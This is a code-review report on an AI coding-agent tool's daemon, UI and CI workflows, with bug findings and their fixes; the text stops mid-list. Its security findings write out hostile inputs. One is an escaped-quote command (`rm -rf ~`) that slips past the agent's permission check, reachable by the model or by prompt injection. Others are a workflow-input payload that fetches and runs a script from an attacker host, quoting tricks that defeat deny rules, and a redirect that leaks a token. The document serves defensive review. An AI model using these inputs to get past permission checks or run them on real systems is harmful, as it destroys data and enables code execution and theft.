# Code review — August 2026

A full-repository bug hunt across the Go backend, the Web UI, and the
build/CI surface. Six reviewers worked in parallel, one per subsystem;
findings below are consolidated and de-duplicated. Several defects were
found independently by more than one reviewer — those cross-confirmations
are marked, and carry the most weight.

**Status:** every critical is **fixed** — C1–C4, then C5–C7 (see the FIXED
markers). Everything else stands as reported.

## Coverage

| Area | Status |
|---|---|
| agent / session / events / memory | reviewed |
| dictation (whisper + sherpa) | reviewed |
| tools / shell / rules / hooks / mcp | reviewed |
| config / provider / credentials / awssso / gui / cmd | reviewed |
| markdown renderer (XSS surface) | reviewed (author, direct) |
| uploads path handling, client reconnect | spot-checked (author, direct) |
| daemon HTTP / SSE / client / TUI | reviewed |
| Web UI JS / build scripts / MSI / workflows | reviewed |

Every area is now covered.

Severity: **critical** = data loss, security, or a session that breaks and
stays broken. **major** = wrong behavior a normal user will hit. **minor**
= narrow, cosmetic, or needs an unusual setup.

---

## Critical

### ~~C1~~ FIXED. Shell permission bypass: an escaped quote hides a chained command from the allow/deny check — arbitrary commands auto-run with no prompt
`internal/config/shell.go:76-124` (`splitShellSegments`) — *cross-confirmed by two reviewers; verified directly by the author against both the real function and real bash.*

The segment splitter opens a quote context on a `"` that appears **outside**
quotes, but bash treats that same `"`, when backslash-escaped (`\"`), as a
literal character that does **not** open a quote. The two disagree, and the
permission check trusts the splitter.

Verified:

```
input:  git status \" && rm -rf ~
split:  ["git status \" && rm -rf ~"]   (ONE segment)   unsafe=false
```

That one segment matches the built-in `git *` auto-allow rule, and
`hasUnsafeShellConstruct` sees no `$(`, backtick, or `>` — so it resolves to
**allow, no prompt**. Real bash then runs it as a chain (confirmed: the part
after `&&` executed). `\'` does the same via the single-quote path.

Impact: any allowed command prefix (`git`, or any user allow rule) becomes a
launch point for arbitrary code. The model — or a prompt-injection payload in
a file the model reads — can run `rm -rf ~`, exfiltrate, or install
persistence, all without the permission prompt the whole system exists to
show. This defeats the exact "anything appended to an allowed prefix" attack
the file's own header says the splitter was written to stop.

**Fixed.** `splitShellSegments` now models bash's backslash rule outside
quotes: an unquoted `\` makes the next character literal, so it can neither
open a quote nor act as a separator. The payload above now splits into
`["git status \"", "rm -rf ~"]`, the `rm` segment matches no allow rule, and
the line falls back to `ask`. Covered by
`TestSplitShellSegmentsHonorsBackslashOutsideQuotes` (7 cases, including
Windows paths and a trailing backslash) and
`TestEscapedQuoteCannotSmuggleACommandPastAnAllowRule`.

### ~~C2~~ FIXED. A cancelled turn (Esc before the first token) writes an empty assistant message that permanently breaks the session
`internal/agent/turn.go:97-105`; provider `send` sites in `bedrock.go:249-256`, `anthropic.go:223-230`, `openai.go` — *cross-confirmed by two reviewers.*

On context cancellation every provider's stream goroutine returns and closes
its channel **without** emitting a terminal `EventMessageStop`/`EventError`.
`consumeStream` reads the closed channel as a normal end and unconditionally
appends `provider.Message{Role: Assistant, Content: assistantBlocks}` — with
zero blocks when the user cancelled before the first delta (common: Esc during
prefill of a long prompt, or the `POST /sessions/{id}/cancel` button).

Anthropic and Bedrock both reject a message with empty content, so **every
later turn in that session 400s**. History is rehydrated from the event log,
so it survives a restart — except `rehydrateHistory` happens to drop the empty
message (`rehydrate.go:108`), which means a daemon restart silently repairs
what the live process broke. That divergence is itself a smell, and confirms
the live path is the buggy one.

### ~~C3~~ FIXED. A provider error mid-turn leaves history ending in a user message; Bedrock then rejects every retry, forever
`internal/agent/turn.go:74-105` + `internal/provider/bedrock.go:73-120` (`toBedrockMessages`, no consecutive-role merge) — *cross-confirmed by two reviewers.*

The user message is appended to history **before** the provider call. If
`p.Chat` errors synchronously (e.g. a Bedrock `ThrottlingException` — no
adapter has retry logic) or the stream returns an `EventError`, the function
returns before the assistant message is appended. History now ends with a user
message; the user's retry appends another → `[…, user, user]` → Bedrock's
Converse API rejects non-alternating roles with a `ValidationException`, on
every retry. The code already knows Bedrock rejects back-to-back user messages
(the `takeInjected` comment guards exactly that) but only on the injected-input
path, not the error path. A defensive merge in `toBedrockMessages` would
contain the whole family (C2, C3, C4).

### ~~C4~~ FIXED. Auto-compaction always produces two consecutive user messages on the next turn — breaks Bedrock the moment it fires
`internal/agent/compact.go:88-91` + `turn.go:61-77`.

`compactHistory` collapses history to a single `RoleUser` summary. The next
turn appends the new user message → `[user(summary), user(prompt)]`. Anthropic
and OpenAI accept it; **Bedrock rejects it** — so on Bedrock, the instant
auto-compaction fires at 80% context (or the user runs `/compact`), the next
turn errors, and per C3 the session never recovers. Nothing merges the summary
into the following user turn.

### Fix for C2–C4

One guard plus two source fixes, in `internal/agent`:

* **`history.go` (new) — `sendableHistory`.** Applied to every outgoing
  request (`turn.go`, and the compaction call in `compact.go`). Drops empty
  messages and merges consecutive same-role messages, so both texts still
  reach the model, in order, in one message. A guard rather than a design:
  history should already alternate, but the cost of it not doing so was out of
  all proportion to the mistake.
* **`turn.go` — no empty assistant message.** A turn that produced no blocks
  records nothing, matching what `rehydrateHistory` already reconstructed from
  the log.
* **`compact.go` — the compaction request is normalized too.** History
  routinely ends with a user-role message (tool results are one), so appending
  the instructions after it made two in a row — meaning on Bedrock the
  compaction call itself failed, which is the one call that must not, since it
  is what rescues a session that has run out of context. This instance was not
  in the original report.

Verified end-to-end through the real `Loop` and a real HTTP provider, asserting
on the JSON that actually goes out:
`TestRetryAfterProviderErrorSendsAValidConversation` and
`TestTurnCancelledBeforeFirstTokenLeavesAUsableSession`. **Both were confirmed
to fail with the fix reverted** (`retry request has two "user" messages in a
row`) and pass with it.

`TestAutoCompactTriggersAboveThresholdAndResetsHistory` was asserting the old
shape — "system + summary + new turn = 3 messages", i.e. the two-consecutive-user
bug as expected behavior. It now asserts 2 messages, that no two adjacent
messages share a role, and that both the summary and the new prompt reach the
model.

### ~~C5~~ FIXED. One tool output over 1 MB wedges the TUI permanently
`internal/client/client.go:376-377` — *verified directly by the author.*

`SubscribeEvents` caps its `bufio.Scanner` at 1 MB and never checks
`scanner.Err()`, so an over-long `data:` line ends the scan
indistinguishably from a clean EOF. Nothing in `internal/tools/` truncates
tool output (confirmed: no size cap anywhere in the package), and
`turn.go` puts the whole of `res.Content` into one `tool.end` event, which
`sse.go` marshals onto a single line.

So: the model runs `cat somebig.log`, or reads a file over a megabyte. The
scan stops, the channel closes, `StreamEvents` reconnects after 1s from the
seq *before* the oversized event, the daemon replays that same event from the
log, and it fails again — once a second, forever. The TUI stops updating at
that point and the spinner never clears. **Restarting does not help**: resume
starts at `since = 0`, so the replay hits the same event again.

The Web UI is unaffected (`EventSource` has no line cap), which is why this
would present as "the TUI hangs on big tool output" rather than as a
protocol bug.

**Fixed.** The stream is read with a `bufio.Reader` and `ReadString('\n')`,
which has no line limit to choose wrongly — matching what `EventSource`
already did. Covered by
`TestSubscribeEventsHandlesAnEventLargerThanAMegabyte`, which sends a 3 MB
event followed by an ordinary one and asserts both arrive; **confirmed to fail
with the fix reverted** (`got seqs []`).

### ~~C6~~ FIXED. A keystroke can be consumed as a permission approval the user never saw
`internal/tui/keys.go:28-48` — *verified directly by the author.*

`y`/`n`/`s`/`a` are intercepted whenever `m.pending != nil`, and the handler
returns "consumed" so the character never reaches the textarea. But the
textarea stays focused and the modal appears without any interruption.

So: the user is typing "yes, use the second approach" while a turn runs. A
`permission.request` for `bash: rm -rf build/` arrives between keystrokes.
The next `y` is taken as `resolvePermission(id, true, "")` — the command is
approved without the user having read, or even seen, the request. `s` grants
it for the whole session; `a` writes a permanent rule into `config.json`.
There is no confirmation step and nothing to undo it with.

**Fixed.** A bare `y`/`n`/`s`/`a` answers only when both hold:

* **the prompt box is empty** — text in it means the user is writing a
  message, so the letter belongs to that message (whitespace does not count);
* **the request has been on screen for 750 ms** — so a keypress already in
  flight cannot land on a modal that appeared between the keydown and its
  delivery.

Neither costs anything in the ordinary case, which is a user waiting on the
model with an empty box. When the box has text the modal says why the keys are
inert, since otherwise they just look broken. Covered by
`TestTypingLettersDoNotAnswerAPermission` (all four keys),
`TestAFreshRequestIsNotAnsweredImmediately`,
`TestAnEmptyPromptBoxStillAnswersNormally`,
`TestWhitespaceInThePromptBoxDoesNotBlockAnAnswer` and
`TestTheModalExplainsItselfWhileTyping`; **confirmed to fail with the fix
reverted**.

### ~~C7~~ FIXED. A GitHub Actions input is interpolated straight into a shell script
`.github/workflows/gui-windows.yml:60` — *verified directly by the author.*

```yaml
run: |
  v='${{ inputs.version }}'
```

`${{ }}` is substituted textually before bash parses the line, so a "Version
to stamp" value of `'; curl -s https://attacker/x.ps1 | iex; echo '` closes
the literal and runs as commands on the runner — with the job's
`GITHUB_TOKEN` and access to the tree that produces the released
`localcode-gui.exe`. Dispatch needs write access, so this is escalation from
write-to-repo rather than anonymous RCE.

Compounding it, `gui-windows.yml` declares no `permissions:` block at all, so
the job inherits the default token scope (write-all on repos that never
changed it). `whisper-macos.yml` correctly declares `contents: read`.

**Fixed.** The input arrives through `env: LC_INPUT_VERSION` and is read as
`"$LC_INPUT_VERSION"`, which removes the substitution step entirely, and
`gui-windows.yml` now declares `permissions: contents: read`. A scan of both
workflows confirms no `${{ }}` remains inside any `run:` block.

---

## Major

### M1. ~~One slow transcription freezes the entire dictation API for up to a minute~~ FIXED (v0.33.4)

*Confirmed before fixing, with one correction: partial transcriptions run in their own goroutine, so only committing an utterance blocks. The lock chain was exactly as described.* `Session.lastActivity` is atomic, so `Idle` no longer needs the lock a commit holds, and the reaper cannot stall the manager.

`internal/dictation/manager.go:112-121` + `dictation.go:88-113`.

`Session.Write`/`Stop` hold the per-session lock across `Final()` →
`transcribe`, which blocks up to 60s on a wedged whisper-server. The reaper
holds the **manager** lock while calling `s.Idle()`, which needs that same
per-session lock. So one stuck transcription blocks the reaper, which blocks
`Manager.Get`/`Start`/`Stop` — every other client's audio POSTs, new
dictations, and mic-off clicks hang. `Idle` should not need the session lock
(snapshot `lastActivity` atomically), and `Final` should not be called under a
lock the reaper can wait on.

### M2. ~~`acquireWhisper` kills an engine other sessions are actively using~~ FIXED (v0.35.0)

Both halves confirmed. A referenced engine is left alone and the new configuration gets its own process; the key now uses the thread count the process is actually started with.

`internal/dictation/whisper_process.go:100-103`.

On a key mismatch the shared process is killed **without consulting its
refcount**. A second recognizer opened with a different `WhisperModel`/`Threads`
(or a CLI path alongside the daemon) kills the engine out from under a live
`Final()` — the in-flight request resets, and the victim session silently
degrades to stale partials with no error. Compounding it: the key embeds raw
`cfg.Threads`, but `startWhisper` normalizes `0` to `defaultThreads()`, so
`Threads:0` and `Threads:4` (when the default is 4) start identical servers
under different keys and kill-restart each other for no semantic difference.

### M3. ~~Interrupted event log lines are silently truncated, then seq numbers get reused~~ FIXED (v0.34.0)

*Reproduced, and worse than reported: restore returned no error at all, recovered 1 of 4 events, and the next append handed out seq 2 — already in the file.* Read with a `bufio.Reader` now; a torn final line is still skipped, everything before it is not.

`internal/session/session.go:539-551` (`restoreOne`).

`restoreOne` uses a 1MB-capped `bufio.Scanner` and never checks `scanner.Err()`.
No tool truncates its output (bash/read/search have no size cap), so a single
`tool.end` carrying a big file read or chatty build log exceeds 1MB. `Scan`
stops, every later event is dropped, and `nextSeq` restores **below** the true
max — so post-restart appends reuse seq numbers already in the file. That
breaks `Events(since)` / Last-Event-ID replay and silently drops the tail of
the rehydrated conversation.

### M4. ~~Concurrent appends to one session persist out of order and can race `Delete`'s file close~~ FIXED (v0.34.0)

*The ordering half reproduced immediately: ~55 inverted lines per 200 concurrent appends.* The write moved inside the lock that hands out the seq, which also closes the Delete window.

**The fd-reuse claim is wrong.** "With fd reuse the stray write can land in a *different* session's log" does not happen: Go's `os.File` refcounts the descriptor, so a `Write` racing `Close` keeps the fd alive until it finishes and the real close is deferred. Measured directly — 200 rounds of a write racing `Close` against a second file opened straight after, 0 strays. What a racing write could actually lose was one line of a log being deleted anyway.

`internal/session/session.go:369-377`.

The JSONL write happens **outside** the store lock. A background `TaskManager`
task appends `task.status` to the *parent* session while the parent's turn
appends deltas — two appends take seq N and N+1 under the lock, then write to
the file in reverse. Worse, `turnTracker.busy` tracks daemon turns but **not**
TaskManager tasks, so `DeleteAll` can `Close` a running task's log file
mid-write; with fd reuse the stray write can land in a *different* session's
log.

### M5. ~~MCP auth token leaks across a cross-host redirect~~ FIXED (v0.34.0)

*Reproduced against two real servers, next to a plain client for comparison: the plain one sent no `Authorization` to the other host, ours sent the token.* A `CheckRedirect` marks a request that has left the configured host and the transport withholds the configured headers on it; a same-host redirect still carries them, which is pinned by its own test.

`internal/mcp/mcp.go:479-488` (`headerTransport.RoundTrip`).

Headers (e.g. `Authorization: Bearer …`) are injected at the RoundTripper
level on every hop. Go's client strips sensitive headers on a cross-host
redirect only for headers set on the *initial request* — not for ones a custom
RoundTripper re-adds each call. A remote MCP endpoint (or an on-path attacker)
answering `307 Location: https://evil/…` gets the bearer token attached to the
request to `evil`. Fix: a `CheckRedirect` that drops the injected headers on
host change.

### M6. ~~Deny rules are defeated by trivial shell quoting (the milder sibling of C1)~~ FIXED (v0.33.4)

*Reproduced exactly: with `skip_permissions` on, `"curl" http://x` resolved to `allow` against a `curl *` deny.* Each segment is now matched both as written and unquoted, stricter answer wins.

`internal/config/shell.go:20-124`.

A deny rule `curl *` is not matched by `c\url …`, `"curl" …`, or `cu''rl …`,
all of which run `curl`. Without `skip_permissions` the hard deny silently
weakens to a click-through `ask`; **with** `skip_permissions` (`rules.go:198-201`)
that `ask` downgrades to `allow`, so an explicitly denied command runs with no
prompt. Same root cause as C1 (string-glob matching of shell syntax); worth
fixing together.

### M7. ~~Delegation failure records the prompt in the log but not in history → rehydration divergence~~ FIXED (v0.35.0)

The failure is recorded as the reply, so live and restored history agree. Note the consecutive-user-message consequence was already defused by C2/C4.

`internal/agent/delegate.go:58-67`.

`delegatePrompt` writes the `message.user` event before `SpawnSync`; on failure
it writes only an error event and returns, so live history has no trace. After
a restart, `rehydrateHistory` replays that user message with no assistant reply
after it — a dangling user turn, which on the next real turn produces
consecutive user messages (→ Bedrock rejects) and on all providers shows the
model a prompt it never answered.

### M8. ~~Empty-content assistant message rejected on cancel — provider contract~~ NOT A BUG (as of v0.33.2)

Re-checked: C2/C4 normalize outgoing history, so an empty assistant message from a cancel is dropped before it reaches any adapter. What remains is a preference about where the fix lives, not a defect.

`internal/provider/{bedrock,anthropic,openai}.go` `send` — see C2. Listed
again here because the fix belongs partly in the adapters: on `ctx.Done` they
should emit a terminal event so `consumeStream` can distinguish "cancelled,
nothing produced" from "clean finish", rather than the consumer guessing.

### M9. ~~`mcp get` prints stdio env values in plaintext~~ FIXED (v0.35.0)

Names only, matching the header block above it.

`cmd/localcode/mcp_list.go:154-156`.

`printMCPServerDetail` does `env: KEY=VALUE`, while the same file's
`formatMCPCommand` documents that env/header *values* are never printed. A
server added with `-e GITHUB_TOKEN=ghp_…` leaks the token into scrollback or a
pasted bug report. Header values are correctly hidden; env values are not.

### M10. ~~OpenAI-compat usage dropped when the backend attaches it to a content chunk~~ FIXED (v0.35.0)

`internal/provider/openai.go:247-256`.

The `chunk.Usage != nil` read is nested inside `if len(chunk.Choices) == 0`.
vLLM and several OpenAI-compat proxies put `usage` on a chunk that still
carries a choice, so their token accounting is silently lost and the
context-window meter reads nothing.

### M11. Partly fixed (v0.35.0), partly declined

The false success is fixed: an unknown or already-answered id returns 404 instead of `{"status":"resolved"}`.

The session-scoping is **declined on purpose.** The daemon has no authentication at all (documented under Known limitations), so checking the path segment draws no boundary that is not already open — it would only make a legitimate second client fail while changing nothing for anyone else. Worth revisiting if the daemon ever gains auth.

Original finding:

`internal/daemon/tasks.go:12-26` + `internal/agent/permission.go:98` — *verified directly by the author.*

`handleResolvePermission` never reads `r.PathValue("id")` and never checks
that the session exists; it passes `permId` straight to `Broker.Resolve`. The
ids are a process-global counter formatted as `p1`, `p2`, … — guessable by
construction.

So a client watching session B can resolve session A's pending `bash rm -rf`
approval, including with `scope: "always"`, which writes a permanent rule into
`config.json`. The daemon has no auth at all by design (documented under Known
limitations), so this is not a privilege boundary being crossed so much as one
that was never drawn — but a *legitimate* second client can do it by accident,
and the ids being sequential integers makes it trivial either way. Separately,
an unknown or already-resolved id returns `200 {"status":"resolved"}` even
though `Resolve` was a no-op, so a client answering a stale prompt is told it
worked.

### M12. ~~A resolved permission replays as a live modal that blocks the TUI~~ FIXED (v0.33.4)

*Reproduced with a test before fixing.* `applyEvent` handles `permission.resolved`, matched on id.

`internal/tui/events.go:57` — *verified directly by the author.*

`applyEvent` handles `events.TypePermissionRequest` but has no case for
`TypePermissionResolved`, which the broker does append. Resume starts the
stream at `since = 0`, so the whole log replays.

Reopen a session that once had a bash permission granted: the replay sets
`m.pending`, `handleEnter` then refuses every message with "Resolve the
permission request above", and a modal renders for a request answered days
ago. The user has to press y/n — firing a no-op `Resolve` — before the TUI is
usable at all. The same gap means a session with two permission requests only
ever shows the last one.

### M13. ~~A background task that needs a permission hangs forever~~ FIXED (v0.33.4)

**One claim here was wrong and worth recording.** "There is no cancel-task command, so the only way out is restarting the daemon" is false: `POST /api/tasks/{taskId}/cancel`, `TaskManager.Cancel` and `client.CancelTask` all existed. What was missing was any UI calling them, and the broker already had a `ctx.Done()` branch, so cancelling did release the call. The hang itself was real. Fixed by mirroring the request into the nearest visible ancestor session (the ids are process-global, so it is answerable from there with no routing) and by wiring `/tasks cancel <id>`.

`internal/agent/taskmanager.go:107` + `internal/agent/permission.go:103-116`.

`TaskManager.run` calls `SendMessage` with the *task's* session id, so the
broker appends `permission.request` to the child session's log.
`task.spawned`/`task.status` are mirrored to the parent; permission requests
are not, and no client streams the child.

A spawned task that runs an un-whitelisted `bash` call blocks on its channel
forever. The TUI shows "1 background task" indefinitely, and the task holds
one of the `TaskManager.sem` slots, throttling every later spawn. There is no
cancel-task command, so the only way out is restarting the daemon.

### M14. ~~"Nothing is running, resend" is treated as "busy, wait", and the queued prompt is never sent~~ FIXED (v0.33.4)

The handler retries instead of returning that 409. The race window itself is not reproduced in a test; the invariant the retry rests on (inject reporting false means begin will succeed) is.

`internal/tui/update.go:110-119` + `internal/daemon/turns.go:208`.

`turns.go` returns 409 for two different situations, and its own comment says
so: the ordinary "a turn is running" case, and the narrow one where the turn
ended between `begin` and `inject`, for which "the client can simply send it
again". `client.IsBusy` cannot tell them apart, so the TUI queues the prompt
and starts waiting for a `turn.done` that has already been appended. The
prompt sits in the queue and the spinner runs until the user types something
else. No test covers a 409 with no turn running.

### M15. ~~No request-body size limit on any JSON handler~~ FIXED (v0.34.0)

One megabyte, via `http.MaxBytesReader`, on all fourteen.

`internal/daemon/turns.go:179`, `sessions.go:20,219,250`, `settings.go:56,118,142,159`, `tasks.go:20,34`, `workspace.go:42`.

Every one decodes `r.Body` with no `http.MaxBytesReader`. `dictation.go` and
`uploads.go` both cap theirs, so this is an inconsistency rather than a
decision. A `POST /api/sessions/{id}/messages` with a multi-gigabyte `text`
allocates the whole string before the empty check, and on success writes it
into the session log. Matters because `--listen` can bind a non-loopback
address.

### M16. ~~Workspace switch is a check-then-act race against a starting turn~~ FIXED (v0.35.0)

The workspace switch, the fork and the delete each run their whole operation with turns held off rather than merely checking first.

`internal/daemon/workspace.go:85-104`.

`anyRunning()` exists precisely so "a tool call mid-execution against the old
directory doesn't silently start seeing the new one", but nothing holds the
turn lock across the stat and the `os.Chdir`. A turn that begins between the
two runs its first relative-path `write_file` against the *new* directory — a
write into the wrong repository, with no error anywhere.
`handleDeleteSession` and `handleForkSession` have the same shape; a fork
racing a starting turn copies a log with a dangling tool call, which is the
provider rejection the guard's comment says it prevents.

### M17. ~~Unbounded dictation sessions, each holding a model open~~ FIXED (v0.35.0)

Capped at 16, checked again after the open since that is the slow part.

`internal/daemon/dictation.go:36-49` + `internal/dictation/manager.go:49`.

`Manager.Start` opens a recognizer per request with no cap and no per-client
accounting; the reaper runs every 60s and only collects sessions already idle
for 120s. A loop of `POST /api/dictation` opens recognizers faster than they
can be reaped. No auth is required.

### M18. Mid-turn text typed during the model's *final* reply leaves a permanent duplicate row
`internal/daemon/static/js/transcript.js:26-44` + `events.js:29` — *verified directly by the author.*

`resolvePendingUser` only runs when `message.user` carries `injected: true`.
That flag is written in exactly one place — `turn.go:166`, inside
`takeInjected` — and `takeInjected` is called from exactly one place:
`turn.go:131`, **after a tool call**.

So when the user types while the model is streaming its closing answer (no
further tool calls), the daemon accepts it with `202 injected`, the client
draws the grey "sent — the model will pick this up at its next step" row, and
then `finishOrTake` re-enters via `SendMessage`, which appends a plain
`message.user` with no `injected` key. The grey row is never resolved, a
second `You:` row appears below it, and the `sentPlaceholders` entry leaks
until the session is switched.

This is the common case, not a corner: typing while the model writes its final
answer is precisely when there is no next tool call. The 409 fallback in
`composer.js:187` has the same shape — it queues the text without removing the
placeholder it just created.

### M19. Cancelling a turn discards injected text but the transcript still says it was delivered
`internal/daemon/static/js/events.js:130-135` + `internal/daemon/turns.go:120-128`.

`turnTracker.cancel` does `delete(t.pending, id)` — the queued text is thrown
away, by design. The client's `turn.cancelled` handler clears `promptQueue`
and `runningTool` but touches neither `sentPlaceholders` nor the DOM row. The
transcript is left permanently asserting *"sent — the model will pick this up
at its next step"* about a message that was deleted and will never be seen.
Reproducible every time.

### M20. ~~Switching sessions with a permission modal open permanently breaks Escape and Tab~~ FIXED (v0.33.3)

`internal/daemon/static/js/sessions.js:158` — *verified directly by the author.*

`modal.js` documents that the `open` class is an *output* of the object and
never an input, and a test asserts nobody reads state back from the DOM — but
`selectSession` does `modalEl.classList.remove('open')` directly instead of
calling `permissionRequest.close()`. The box is hidden; `isOpen` stays `true`
for the life of the page.

Consequences, both silent and permanent: `!permissionRequest.isOpen` is now
false so **Escape stops cancelling turns**, and `anyModalOpen()` returns true
forever so **Tab/Shift-Tab stop cycling agents**. Nothing resets it — only
`permission.resolved` or `resolvePermission` call `.close()`, and neither
fires for a request in the session you just left.

### M21. ~~Answering a permission never unlocks the composer locally~~ FIXED (v0.33.4)

`internal/daemon/static/js/modals.js:219-229` + `events.js:69-74`.

`setInputLocked(true)` happens on `permission.request`; the unlock lives only
in the `permission.resolved` handler. `resolvePermission` closes the modal and
POSTs but never unlocks.

If the event stream has quietly died — the failure the heartbeat reduces but
does not eliminate — the user clicks Allow, the POST succeeds, the turn
proceeds server-side, and the prompt box stays disabled reading "Resolve the
permission request above to continue" over a modal that is no longer there.
No way out but switching sessions. `cancelTurn` already applies the right rule
("act on the reply it holds in its hand"); this path does not.

### M22. ~~Double-clicking the mic leaks a live microphone stream~~ FIXED (v0.35.0)

The harness now counts open microphones, so the leak is visible to a test rather than only to the person whose recording light stays on.

`internal/daemon/static/js/dictation.js:101-147`.

The `if (live) return` guard is on the wrong side of the first `await`:
`live` is not assigned until after `apiClient.startDictation()` resolves. Two
clicks (or one click on a slow network) both pass the guard, both POST, both
call `getUserMedia`. The second assignment orphans the first `MediaStream`,
`AudioContext` and worklet, so `stopDictation` can never stop them — the
browser's recording indicator stays lit after dictation is off and the mic is
held until the tab closes, plus a dangling daemon-side session.

### M23. ~~`stopDictation`'s tail clobbers the prompt box after new input has begun~~ FIXED (v0.35.0)

The span dictation owned is replaced, so text typed after stopping survives. A plain append was tried first and duplicated the provisional text — caught by an existing test.

`internal/daemon/static/js/dictation.js:210-252`.

`live = null` at line 231, but the function keeps awaiting and then
unconditionally writes `inputEl.value = session.committed` from the *old*
session's snapshot. Stop dictation and immediately start typing (or dictating
again): the late round-trip overwrites the box with the text as it stood at
the previous stop, discarding everything since, and moves the caret to the
end.

### M24. ~~Web UI 409 handling parks a prompt indefinitely~~ FIXED (v0.35.0)

One retry, never a loop: a second refusal means a turn really is running and its turn.done drains the queue.

`internal/daemon/static/js/composer.js:139-145,210-219`.

Same root cause as M14 on the TUI side, and the same server contract ignored:
`turns.go` says a 409 in the begin/inject gap means "nothing is running, send
it again". Both client handlers instead push the text back onto
`promptQueue`, leave `waiting === true`, and wait for a `turn.done` that has
already fired. The comm dot blinks forever, the status bar reads
`working… (1 queued)`, and everything typed afterwards queues behind it.

### M25. ~~`DICTATION=0` can be silently ignored on an elevated install~~ FIXED (v0.35.0)

Correct as reported, and the fix is not where it looks: wixl writes SecureCustomProperties itself from MajorUpgrade, so a second Property element fails the build. package-msi.sh appends DICTATION to the generated row and checks that row specifically — a substring check over the table would have matched the DICTATION property itself and passed while the switch stayed broken.

`build/localcode.wxs:320` + `build/package-msi.sh:138` — *verified directly by the author.*

The comment claims upper-case makes the property "survive being passed to the
elevated half of the install". Upper-case is necessary but not sufficient:
Windows Installer only forwards command-line public properties to the server
side if they are listed in `SecureCustomProperties`, and there is no such
property in the file. `InstallDictationModel`'s condition is evaluated in
`InstallExecuteSequence` — the server side.

So a standard user running `msiexec /i … DICTATION=0` and consenting to UAC
gets the default of `1`, and the install performs the ~200MB download it was
explicitly told to skip, with no progress UI since the action is deferred.
`package-msi.sh` verifies the `Property` row exists but not that
`SecureCustomProperties` contains it, so the build check does not catch it.

---

## Minor

- **`internal/dictation/manager.go:49-61,131-149`** — no `closed` state: `Start`
  racing `Close` can spawn a fresh engine *after* `Shutdown`, orphaning a
  whisper-server the exact way the recent fix was meant to prevent. Needs a
  `closed` flag checked under `m.mu`, re-checked at insert.
- **`internal/dictation/whisper_install.go:120-136`** — zip extraction is
  non-atomic and readiness is a bare existence check, so a Ctrl-C mid-extract
  leaves a truncated engine that permanently satisfies "installed" and can
  never self-repair (re-running install is a no-op). The sherpa path got
  stage-and-rename for this reason; the whisper path didn't.
- **`internal/dictation/whisper_process.go:153-188`** — data race on the shared
  `bytes.Buffer`: the exec output-copier goroutine writes while `waitReady`'s
  timeout path calls `tail()` → `log.String()`. `go test -race` on a slow
  startup flags it. (The `alive()==false` branch is safe; the timeout branch is
  not.)
- **`internal/dictation/whisper_process.go:347-354`** — `freePort` TOCTOU:
  the probe port can be taken between listener-close and the child's bind, and
  `waitReady`'s bare TCP dial can bless a *different* process's server. Re-check
  `alive()` after a successful dial.
- **`internal/agent/taskmanager.go:72-87`** — `Spawn` leaks one
  `context.WithCancel` per task (deleted from the map but never called on normal
  completion); grows unbounded over a long daemon run.
- **`internal/agent/taskmanager.go:105-113`** — a task cancelled mid-run is
  reported `status:"failed"` with a context-cancelled error rather than
  `"cancelled"`, so a deliberate stop shows a scary failure.
- **`internal/agent/permission.go:133-137`** — a cancelled turn removes the
  pending permission but never writes a `permission.resolved` event, so a client
  replaying the log renders a prompt that can never be answered.
- **`internal/session/session.go:239-262`** — `Delete` never notifies or closes
  the deleted session's live SSE subscribers; they block until the HTTP client
  itself disconnects. Also `Append`'s marshal error is swallowed (in memory but
  never on disk → replay divergence).
- **`internal/hooks/hooks.go:103-131`** — a `pre_tool_use` hook that hangs is
  killed at 30s and the tool then **proceeds** (fail-open). Documented as
  intentional, but a hook whose job is to *block* should be able to fail closed;
  worth a config knob.
- **`internal/commands/commands.go:185-195`** — slash-command `!…` shell
  expansion runs with `context.Background()` and no timeout, unlike the bash
  tool (2m) and hooks (30s). A blocking embedded command hangs the turn.
- **`internal/tools/{write,edit,read}.go`** — file tools follow symlinks and the
  permission subject is the literal, un-normalized path. An in-workspace allow
  glob is satisfied by a path that is a symlink out of the workspace, or by one
  with `../` components matched verbatim. There is no workspace-root confinement
  at the tool layer — only whatever the permission glob expresses.
- **`internal/mcp/mcp.go:516-552`** — `reconnect` runs `connectOne` outside the
  lock; two concurrent `Execute` calls to the same server can both redial and
  both store into `e.session`, leaking the loser's session (fd/pipe/process).
- **`internal/awssso/awssso.go:107`** — registration expiry hardcoded to
  issued-at + 90d instead of AWS's returned `ClientSecretExpiresAt`; a shorter
  real expiry gets written too-late into the shared cache, so refresh fails
  opaquely instead of prompting re-login.
- **`internal/gui/gui.go:52-81`** — data race on `startErr`/`cleanup` if the
  window closes before `start` finishes; minor (process exits immediately).
- **`internal/modelinfo/modelinfo.go:23-31`** — Claude 3.x IDs
  (`claude-3-5-sonnet-…`, `claude-3-opus-…`) don't match the 4.x substring
  checks, so they fall back to 128k instead of 200k and the context meter
  over-reports ~1.6x. UI-only.
- **`internal/provider/openai.go:297-304`** — `ToolUseEnd` events are emitted by
  ranging a map, so multiple tool calls surface (and execute) in random order
  rather than the order the model issued them.
- **`internal/dictation/download.go:98-160`** — SIGKILL/power-loss strands
  `.download-*` / `.unpack-*` temp files (190–400MB) that no later run sweeps;
  they accumulate invisibly beside the binary. A cheap sweep at the top of
  `install` fixes it.
- **`internal/dictation/engine.go:93-98`** — `Available()` ignores a config
  `whisper_bin` (reports "no recognizer" when `Ready()`/`Open()` would succeed),
  and it gates the sherpa-only `dictation test`, so on a non-gui build with
  whisper installed the friendly guard is bypassed and `Diagnose` returns raw
  `ErrUnavailable`.
- **`internal/daemon/dictation.go:63-79`** — an audio POST racing the reaper
  gets a 400 ("session already stopped") instead of the 404 the client's
  session-expiry handling keys off; wrong signal, harmless server-side.

- **`internal/daemon/turns.go:253-261`** — `turn.done` is appended *after* the
  registration is cleared (deliberately, to avoid a 409 for a client reacting
  to it), which opens the mirror-image race: a new turn can start in between,
  and then turn A's `turn.done` clears every client's spinner and dequeues the
  next prompt into a session that already has turn B running.
- **`internal/daemon/tasks.go:43-47`** — a failed spawn leaves an orphan child
  session on disk. `Spawn` creates the child before appending `task.spawned`
  to the parent, and `handleSpawnTask` never validates that the parent exists,
  so `POST /api/sessions/nope/tasks` 500s and leaves a permanent, invisible
  session behind. Repeats accumulate.
- **`internal/daemon/tasks.go:60-66`** — `/api/tasks/{taskId}/output` passes
  the id straight to `Store.Events` with no check that it names a task, so it
  returns the full output of any session by id.
- **`internal/client/client.go:203-207`** — `ListMCPServers` decodes an array
  of objects into `[]string` and can never succeed. Dead code today; it fails
  the moment someone wires it into the status bar.
- **`internal/daemon/sessions.go:233,260`, `turns.go:231,238,260`** —
